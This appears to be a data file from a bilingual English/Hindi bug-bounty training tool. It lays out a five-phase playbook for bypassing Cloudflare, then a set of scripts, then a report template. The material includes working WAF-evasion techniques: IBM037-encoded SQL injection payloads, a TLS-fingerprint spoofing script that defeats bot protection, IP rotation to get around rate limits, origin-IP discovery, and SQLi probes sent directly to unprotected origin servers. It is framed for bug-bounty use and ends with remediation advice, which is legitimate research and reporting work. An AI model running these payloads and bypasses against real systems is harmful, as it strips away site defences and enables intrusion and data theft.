        hi: "सभी सबडोमेन के IPs निकालें और Cloudflare IPs को असली होस्टिंग IPs से अलग करें।",
      },
    ],
    commandsOrPayloads: [
      "wafw00f https://target.com",
      "subfinder -d target.com -silent | dnsx -a -resp -silent | grep -v -E '104\\.|172\\.6[4-9]|172\\.7[0-1]|162\\.15[8-9]'",
      "curl -I https://target.com | grep -iE 'cf-|server|set-cookie'",
    ],
    keyTargets: [
      "Cloudflare Ray ID and Challenge Page type",
      "List of Non-Cloudflare IP addresses on subdomains",
      "HTTP/2 and HTTP/3 support on target edge",
    ],
  },
  {
    phase: 2,
    title: {
      en: "Phase 2: Comprehensive Origin IP Hunting (Hours 6 – 18)",
      simple: "Locate the Real Server IP Behind Cloudflare",
      hi: "फेज़ 2: असली ओरिजिन IP की खोज (घंटे 6 – 18)",
    },
    objective: {
      en: "Execute all 7 Origin IP discovery techniques to unmask the real backend hosting infrastructure.",
      simple: "Use historical records, SSL certificates, and outbound emails to find the real IP.",
      hi: "पुरानी DNS हिस्ट्री, SSL सर्टिफिकेट्स और आउटबाउंड ईमेल के ज़रिये असली सर्वर का पता लगाएं।",
    },
    steps: [
      {
        en: "Query SecurityTrails, ViewDNS, and DNSHistory for historical A records dating back before Cloudflare onboarding.",
        simple: "Check old DNS records from before the company added Cloudflare.",
        hi: "SecurityTrails और ViewDNS पर पुरानी DNS हिस्ट्री चेक करें।",
      },
      {
        en: "Query Shodan, Censys, and FOFA for SSL certificates matching the target domain (`ssl.cert.subject.cn:\"target.com\"`).",
        simple: "Search Shodan and Censys for matching SSL certificates.",
        hi: "Shodan और Censys पर SSL सर्टिफिकेट मैच करके ओरिजिन IPs निकालें।",
      },
      {
        en: "Trigger password reset or signup verification emails and inspect raw SMTP `Received:` headers for the sender's origin IP.",
        simple: "Inspect email headers from password reset messages.",
        hi: "पासवर्ड रीसेट ईमेल के हेडर में ओरिजिन IP चेक करें।",
      },
      {
        en: "Verify all candidate IPs using `curl -k --resolve target.com:443:<IP> https://target.com`.",
        simple: "Test the found IPs to see if they load the target website directly.",
        hi: "`curl --resolve` से हर IP को टेस्ट करें और ओरिजिन सर्वर कन्फर्म करें।",
      },
    ],
    commandsOrPayloads: [
      "# Censys CLI / API search:",
      "censys search 'services.tls.certificates.leaf_data.names: target.com and not services.dns.names: cloudflare'",
      "# Verify Candidate IP directly:",
      "curl -k -v --resolve target.com:443:198.51.100.25 https://target.com/",
    ],
    keyTargets: [
      "Candidate Origin IP addresses",
      "AWS EC2 / DigitalOcean / Hetzner bare IP pools",
      "SMTP server IP vs Web server IP",
    ],
  },
  {
    phase: 3,
    title: {
      en: "Phase 3: Charset Smuggling & Payload Obfuscation (Hours 18 – 30)",
      simple: "Craft Payloads That Sneak Past Cloudflare WAF",
      hi: "फेज़ 3: Charset स्मगलिंग व पेलोड ओबफस्केशन (घंटे 18 – 30)",
    },
    objective: {
      en: "If Origin IP is firewalled, bypass Cloudflare Managed Rulesets using character encoding and parsing discrepancies.",
      simple: "Encode your attack payloads so Cloudflare cannot recognize them.",
      hi: "अगर ओरिजिन IP पर सीधा फ़ायरवॉल लगा हो, तो एनकोडिंग तकनीकों से Cloudflare WAF को चकमा दें।",
    },
    steps: [
      {
        en: "Test alternate character sets on JSON endpoints: `Content-Type: application/json; charset=ibm037`.",
        simple: "Test ancient charsets like IBM037 on JSON APIs.",
        hi: "JSON APIs पर `charset=ibm037` और `charset=utf-7` टेस्ट करें।",
      },
      {
        en: "Apply SQLi inline comments (`/*!50000SELECT*/`), whitespace variations (`%09`, `%0a`), and URL double-encoding (`%2527`).",
        simple: "Use SQL comments and double encoding to hide forbidden words.",
        hi: "SQLi में इनलाइन कमेंट्स और डबल एनकोडिंग लगाकर कीवर्ड्स छुपाएं।",
      },
      {
        en: "Wrap JSON payloads in multipart/form-data with trailing quotes or duplicate boundary headers.",
        simple: "Wrap your payload inside multipart form-data.",
        hi: "पेलोड्स को multipart/form-data में पैक करके WAF पार्सर को चकमा दें।",
      },
    ],
    commandsOrPayloads: [
      "# Python IBM037 payload generator:",
      "python3 -c 'import urllib.parse; p = \"{\\\"query\\\": \\\"1' OR '1'='1\\\"}\"; print(urllib.parse.quote(p.encode(\"ibm037\")))'",
    ],
    keyTargets: [
      "Search and filtering endpoints",
      "JSON authentication and profile update APIs",
      "File upload and comment forms",
    ],
  },
  {
    phase: 4,
    title: {
      en: "Phase 4: Bot Shield & TLS Fingerprint Emulation (Hours 30 – 40)",
      simple: "Bypass Captchas and Automated Fuzzing Blockers",
      hi: "फेज़ 4: बोट शील्ड व TLS फिंगरप्रिंट इम्यूलेशन (घंटे 30 – 40)",
    },
    objective: {
      en: "Bypass Cloudflare Bot Management and Turnstile challenges to execute automated directory fuzzing and vulnerability scanning.",
      simple: "Make your automated scanners look like real humans using real browsers.",
      hi: "ऑटोमेटेड स्कैनर्स को असली Chrome की तरह दिखाकर बिना कैप्चा के हाई-स्पीड स्कैनिंग करें।",
    },
    steps: [
      {
        en: "Locate native mobile app APIs (`/mobile/v1/*`, `api.target.com`) where Turnstile challenges are disabled.",
        simple: "Find mobile app endpoints where captchas cannot be shown.",
        hi: "मोबाइल ऐप के APIs खोजें जहाँ कैप्चा बंद होता है।",
      },
      {
        en: "Use `tls-client` or `curl-impersonate` with Chrome 120+ JA4 fingerprint profiles for custom automated scripts.",
        simple: "Run your automation through tls-client to spoof browser TLS handshakes.",
        hi: "कस्टम स्क्रिप्ट्स में `tls-client` का उपयोग करके Chrome का फिंगरप्रिंट कॉपी करें।",
      },
      {
        en: "Set up AWS API Gateway (Fireprox) to rotate IP addresses on every request, neutralizing Cloudflare IP rate limiting.",
        simple: "Use rotating IPs to avoid rate limit blocks.",
        hi: "Fireprox या रोटेटिंग प्रॉक्सी से हर रिक्वेस्ट का IP बदलें ताकि रेट लिमिट न लगे।",
      },
    ],
    commandsOrPayloads: [
      "curl_chrome116 -sL https://target.com/api/v1/data",
      "fireprox --command create --url https://target.com",
    ],
    keyTargets: [
      "Mobile API subdomains (`mobile.*`, `app-api.*`)",
      "High-throughput fuzzing endpoints",
      "GraphQL query batching",
    ],
  },
  {
    phase: 5,
    title: {
      en: "Phase 5: Direct Origin Exploitation & Report Filing (Hours 40 – 48)",
      simple: "Exploit the Unprotected Server and Submit High-Impact Report",
      hi: "फेज़ 5: ओरिजिन सर्वर पर हमला व हाई-इम्पैक्ट रिपोर्ट सबमिशन (घंटे 40 – 48)",
    },
    objective: {
      en: "Deliver your core vulnerability (SQLi, BOLA, RCE, SSRF) directly to the Origin IP and document the complete bypass chain for maximum bounty payout.",
      simple: "Deliver the attack without WAF interference and document how bypassing Cloudflare exposed the company.",
      hi: "WAF हटने के बाद सीधे सर्वर पर मुख्य बग (SQLi/BOLA) निकालें और रिपोर्ट सबमिट करें।",
    },
    steps: [
      {
        en: "Re-run your blocked payloads directly against the Origin IP via `curl -H 'Host: target.com' http://<ORIGIN_IP>/vulnerable-endpoint`.",
        simple: "Re-send your blocked attack directly to the origin server.",
        hi: "ओरिजिन IP पर सीधे वही पेलोड भेजें जो पहले Cloudflare पर ब्लॉक हो रहा था।",
      },
      {
        en: "Extract database data or trigger internal canary commands confirming the vulnerability succeeds without edge WAF protection.",
        simple: "Prove the attack works when sent straight to the server.",
        hi: "साबित करें कि WAF के बिना सर्वर पर अटैक 100% काम करता है।",
      },
      {
        en: "Draft your vulnerability report detailing the Origin IP disclosure as a force multiplier that re-exposes the application to critical exploitation.",
        simple: "Write a high-impact bug report showing how bypassing Cloudflare made the attack possible.",
        hi: "एक विस्तृत रिपोर्ट तैयार करें जिसमें दिखाएं कि कैसे Origin IP मिलने से कंपनी की पूरी सुरक्षा खत्म हो गई।",
      },
    ],
    commandsOrPayloads: [
      "# Direct origin proof of concept:",
      "curl -k -i -H 'Host: target.com' 'https://<ORIGIN_IP>/api/users?id=1%20OR%201=1'",
    ],
    keyTargets: [
      "Vulnerable parameters previously blocked by WAF",
      "Database schema extraction",
      "Proof-of-Concept video / screenshot without Cloudflare headers",
    ],
  },
];

// ─── 3. CLOUDFLARE ATTACK LAB & AUTOMATION SCRIPTS ───────────────────────────
export const CLOUDFLARE_TOOLS_STASH: CloudflareToolSnippet[] = [
  {
    id: "origin-ip-verifier",
    title: {
      en: "Automated Origin IP Candidate Verifier (Bash One-Liner)",
      simple: "Bash Script to Test If an IP Is the Real Server Behind Cloudflare",
      hi: "ओरिजिन IP कैंडिडेट को तुरंत वेरीफाई करने वाली Bash स्क्रिप्ट",
    },
    description: {
      en: "Tests a list of discovered IP addresses to verify whether they respond to the target domain's Host header without returning Cloudflare edge headers (`cf-ray`).",
      simple: "Feeds a list of IPs and tells you immediately which one is the real website server.",
      hi: "IPs की लिस्ट को चेक करके तुरंत बताती है कि कौन सा IP असली बैकएंड सर्वर है।",
    },
    category: "origin_finder",
    language: "bash",
    code: `#!/usr/bin/env bash
# Usage: ./verify_origin.sh target.com ip_candidates.txt

TARGET="$1"
IP_FILE="$2"

echo "[*] Testing candidate IPs for Origin Server of: $TARGET"

while IFS= read -r IP || [ -n "$IP" ]; do
    [[ -z "$IP" || "$IP" =~ ^# ]] && continue

    # Send HTTPS request directly to candidate IP with real Host header
    RES=$(curl -s -k -m 5 -o /dev/null -w "%{http_code} | %{header_json}" \\
         --resolve "\${TARGET}:443:\${IP}" "https://\${TARGET}/" 2>/dev/null)

    # Check if Cloudflare cf-ray header is ABSENT and HTTP code is 200/301/302
    if echo "$RES" | grep -qv "cf-ray" && echo "$RES" | grep -qE "200|301|302"; then
        echo "[!] BINGO! Discovered Origin IP: $IP (No cf-ray header, HTTP OK)"
    else
        echo "[-] $IP is either Cloudflare or not answering for $TARGET"
    fi
done < "$IP_FILE"`,
    howToUse: {
      en: "Save discovered IPs from Shodan, Censys, and historical DNS into `ips.txt`. Run `./verify_origin.sh target.com ips.txt`. Any IP flagged with [!] BINGO is your real unproxied backend server!",
      simple: "Put candidate IPs into a text file and run this script to instantly find the real server IP.",
      hi: "Shodan और Censys से मिले IPs को टेक्स्ट फाइल में सेव करें और यह स्क्रिप्ट चलाएं। [!] BINGO वाला IP आपका असली सर्वर है!",
    },
  },
  {
    id: "python-tls-client-bot-bypass",
    title: {
      en: "Cloudflare Turnstile & Bot Shield Bypass using Python tls-client",
      simple: "Python Script to Bypass Cloudflare Bot Management with Chrome Fingerprint",
      hi: "Python में Cloudflare बोट शील्ड बाईपास करने के लिए tls-client कोड",
    },
    description: {
      en: "Python automation script leveraging `tls-client` to spoof Chrome 120+ JA3/JA4 TLS handshake and HTTP/2 settings, evading Cloudflare automated scraper detection.",
      simple: "Python script that mimics Google Chrome perfectly so Cloudflare never shows captchas or blocks your scripts.",
      hi: "यह पाइथन कोड असली Google Chrome का नेटवर्क फिंगरप्रिंट बनाकर Cloudflare बोट प्रोटेक्शन को आसानी से बाईपास करता है।",
    },
    category: "tls_fingerprint",
    language: "python",
    code: `import tls_client

def make_stealth_session():
    # Emulate Google Chrome on macOS
    session = tls_client.Session(
        client_identifier="chrome_120",
        random_tls_extension_order=True
    )
    return session

def fetch_protected_endpoint(url):
    session = make_stealth_session()
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"macOS"',
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1"
    }

    print(f"[*] Requesting: {url} with Chrome 120 JA4 TLS Fingerprint...")
    response = session.get(url, headers=headers)
    print(f"[+] Status Code: {response.status_code}")
    return response.text

# Example:
# html = fetch_protected_endpoint("https://target.com/protected-catalog")`,
    howToUse: {
      en: "Install library via `pip install tls-client`. Run this script against any endpoint that gives 403 Forbidden with standard `requests.get()`. Watch Cloudflare grant access with HTTP 200 OK!",
      simple: "Run `pip install tls-client` and use this script to fetch pages that normally block Python scripts.",
      hi: "`pip install tls-client` करें और इस स्क्रिप्ट से वो पेजेस लोड करें जो आम तौर पर Python को 403 ब्लॉक कर देते हैं!",
    },
  },
  {
    id: "ibm037-payload-converter",
    title: {
      en: "IBM037 / EBCDIC WAF Bypass Payload Encoder (Python)",
      simple: "Convert Attack Payloads into IBM037 to Slip Past Cloudflare",
      hi: "पेलोड को IBM037 (EBCDIC) में बदलने वाली पाइथन स्क्रिप्ट",
    },
    description: {
      en: "Encodes raw JSON SQLi or XSS payloads into IBM037 EBCDIC format to bypass Cloudflare Managed Rulesets on Java, Python, and ASP.NET backends.",
      simple: "Encodes your attack into an ancient charset that Cloudflare cannot read but backends decode easily.",
      hi: "यह स्क्रिप्ट आपके पेलोड को IBM037 में बदल देती है जिससे Cloudflare WAF उसे पकड़ नहीं पाता।",
    },
    category: "waf_encoding",
    language: "python",
    code: `import sys

def encode_ibm037(payload_str):
    """Encodes ASCII/UTF-8 string to IBM037 (EBCDIC) format for WAF evasion."""
    encoded_bytes = payload_str.encode('ibm037')
    # Print formatted for Burp Repeater raw body
    hex_repr = ''.join(f'\\\\x{b:02x}' for b in encoded_bytes)
    url_repr = ''.join(f'%{b:02x}' for b in encoded_bytes)
    
    print("[*] Original Payload:", payload_str)
    print("[+] Burp Raw Hex Bytes:", hex_repr)
    print("[+] URL-Encoded IBM037:", url_repr)
    print("\\n[*] Header to include in Burp Suite:")
    print("Content-Type: application/json; charset=ibm037")

# Example usage:
sample_sqli = '{"username": "admin\\' OR 1=1--"}'
encode_ibm037(sample_sqli)`,
    howToUse: {
      en: "Run `python3 ibm037_encoder.py`. Copy the generated bytes into Burp Suite Repeater and set `Content-Type: application/json; charset=ibm037`.",
      simple: "Run this script to get encoded bytes and paste them into Burp Suite.",
      hi: "स्क्रिप्ट चलाएं, आउटपुट बाइट्स को Burp में पेस्ट करें और हेडर में `charset=ibm037` जोड़ें।",
    },
  },
  {
    id: "burp-origin-routing-config",
    title: {
      en: "Burp Suite Hostname Resolution Map (Direct Origin Setup)",
      simple: "Configure Burp Suite to Route All Traffic Directly to Origin IP",
      hi: "Burp Suite में सभी रिक्वेस्ट्स को सीधे ओरिजिन IP पर भेजने की सेटिंग",
    },
    description: {
      en: "Configuration snippet for Burp Suite's Hostname Resolution feature to automatically route all project traffic to the discovered Origin IP while keeping the domain name and TLS cert valid.",
      simple: "Forces Burp Suite to talk straight to the real server without touching Cloudflare.",
      hi: "Burp Suite की यह सेटिंग आपकी सभी रिक्वेस्ट्स को Cloudflare के बजाय सीधे असली सर्वर पर भेजती है।",
    },
    category: "burp_rules",
    language: "json",
    code: `{
  "burp_settings_instructions": [
    "1. Open Burp Suite -> Settings (Top Right Gear Icon).",
    "2. Navigate to: Network -> Connections -> Hostname Resolution.",
    "3. Click 'Add' to create a custom DNS override:",
    "   Host: target.com",
    "   IP Address: <DISCOVERED_ORIGIN_IP> (e.g. 198.51.100.42)",
    "4. Check 'Enabled'.",
    "5. (Optional) Also map all wildcard subdomains (*.target.com -> <ORIGIN_IP>).",
    "6. Now, browse target.com in Burp's embedded browser.",
    "7. Result: All requests bypass Cloudflare WAF, Captchas, and Rate Limits at the network layer!"
  ]
}`,
    howToUse: {
      en: "Enter this configuration in Burp Suite. Once mapped, every active scan, Intruder attack, and manual Repeater request connects directly to the Origin IP, completely bypassing Cloudflare without modifying request headers!",
      simple: "Add this mapping in Burp Settings so every tool in Burp bypasses Cloudflare automatically.",
      hi: "Burp सेटिंग्स में यह मैपिंग करें। इसके बाद Burp Scanner, Intruder और Repeater सब Cloudflare को छोड़कर सीधे असली सर्वर से बात करेंगे!",
    },
  },
];

// ─── 4. HACKERONE / BUGCROWD REPORT TEMPLATES ─────────────────────────────────
export const CLOUDFLARE_REPORT_TEMPLATES: CloudflareReportTemplate[] = [
  {
    id: "p3-origin-ip-waf-bypass",
    title: {
      en: "Direct Origin IP Exposure Leading to Complete Cloudflare WAF & Rate-Limit Bypass",
      simple: "P3/P4 Report: Real Server IP Exposed, Bypassing Cloudflare WAF Completely",
      hi: "P3/P4 रिपोर्ट: ओरिजिन IP लीक होने से Cloudflare WAF और रेट लिमिट का पूर्ण बाईपास",
    },
    vulnType: "Security Misconfiguration > Direct Server Access / Origin IP Exposure",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L",
    severity: "medium",
    reportMarkdown: `## Summary
The Origin web server IP address (\`198.51.100.42\`) hosting **target.com** is exposed to the public Internet and accepts direct HTTP/HTTPS connections without enforcing Cloudflare IP allowlisting. An external attacker can send requests directly to the origin server using the \`Host: target.com\` header, completely bypassing all Cloudflare Web Application Firewall (WAF) rulesets, Cloudflare Bot Management (Turnstile), and Edge Rate Limiting.

Furthermore, attack payloads (such as SQL Injection canary probes and automated high-frequency parameter fuzzing) that are strictly blocked by Cloudflare with HTTP 403 (Ray ID) on the public edge domain are accepted and executed without restriction when transmitted directly to the Origin IP.

## Vulnerability Details
- **Protected Domain**: \`https://target.com\` (Sitting behind Cloudflare Edge Proxy)
- **Exposed Origin IP**: \`198.51.100.42\`
- **Hosting Provider**: AWS EC2 / DigitalOcean
- **CWE**: CWE-284: Improper Access Control / CWE-16: Configuration
- **Bugcrowd VRT**: Server-Side Misconfiguration > Direct Server Access Past Edge WAF

## Method of Discovery
The origin IP address was identified via SSL/TLS Certificate Transparency matching on Censys:
- **Search Query**: \`services.tls.certificates.leaf_data.names: "target.com" and not services.dns.names: "cloudflare"\`
- The host at \`198.51.100.42\` responded with the valid wildcard certificate for \`*.target.com\`.

## Steps to Reproduce & Proof of Concept

### Step 1: Verification of Cloudflare WAF on Edge Domain
When sending a test injection payload through the public Cloudflare domain, the edge proxy blocks the request with HTTP 403:

\`\`\`bash
curl -i -s "https://target.com/api/v1/search?q='%20OR%201=1--"
\`\`\`

**Output (Blocked by Cloudflare WAF):**
\`\`\`http
HTTP/2 403 Forbidden
server: cloudflare
cf-ray: 8df991a0b92182-BOM
content-type: text/html; charset=UTF-8

<!DOCTYPE html>
<!-- Cloudflare Error 1020: Access Denied (WAF Rule Triggered) -->
\`\`\`

### Step 2: Direct Origin Request (Bypassing Cloudflare WAF)
Sending the exact same injection request directly to the discovered Origin IP using cURL's \`--resolve\` flag:

\`\`\`bash
curl -i -k -s --resolve target.com:443:198.51.100.42 "https://target.com/api/v1/search?q='%20OR%201=1--"
\`\`\`

**Output (Accepted and Processed Unfiltered by Origin):**
\`\`\`http
HTTP/1.1 200 OK
Server: nginx/1.24.0
Content-Type: application/json

{
  "status": "success",
  "query_results": [ ... ],
  "note": "Notice the absence of cf-ray and cloudflare headers!"
}
\`\`\`

## Impact
1. **Neutralization of Security Controls**: The multi-thousand-dollar Cloudflare Enterprise WAF security perimeter is rendered completely ineffective.
2. **Amplifier for High-Severity Attacks**: Any application-layer flaw (SQL Injection, Remote Code Execution, BOLA, IDOR) that Cloudflare would normally scrub can now be delivered unfiltered directly to the backend.
3. **Denial of Service & Scraping**: Edge rate limiting and DDoS mitigation layers are bypassed, leaving the origin host exposed to volumetric compute exhaustion.

## Remediation & Fix Recommendation
1. **Enforce Firewall Ingress Rules**: Configure your cloud provider's security group (AWS Security Group / DigitalOcean Cloud Firewall / iptables) to only accept incoming traffic on ports 80 and 443 from official Cloudflare IP ranges:
   - [Cloudflare Official IPv4 Ranges](https://www.cloudflare.com/ips-v4/)
   - [Cloudflare Official IPv6 Ranges](https://www.cloudflare.com/ips-v6/)
   Drop all other inbound packets by default (\`DEFAULT POLICY: DROP\`).
2. **Deploy Cloudflare Authenticated Origin Pulls (AOP)**: Require TLS client certificate authentication between Cloudflare and your origin web server so only Cloudflare's proxies can establish a TLS connection.
3. **Rotate Origin IP**: Once the firewall is secured, allocate a new Elastic IP for the backend to prevent attackers from targeting the old cached IP address.`,
  },
];
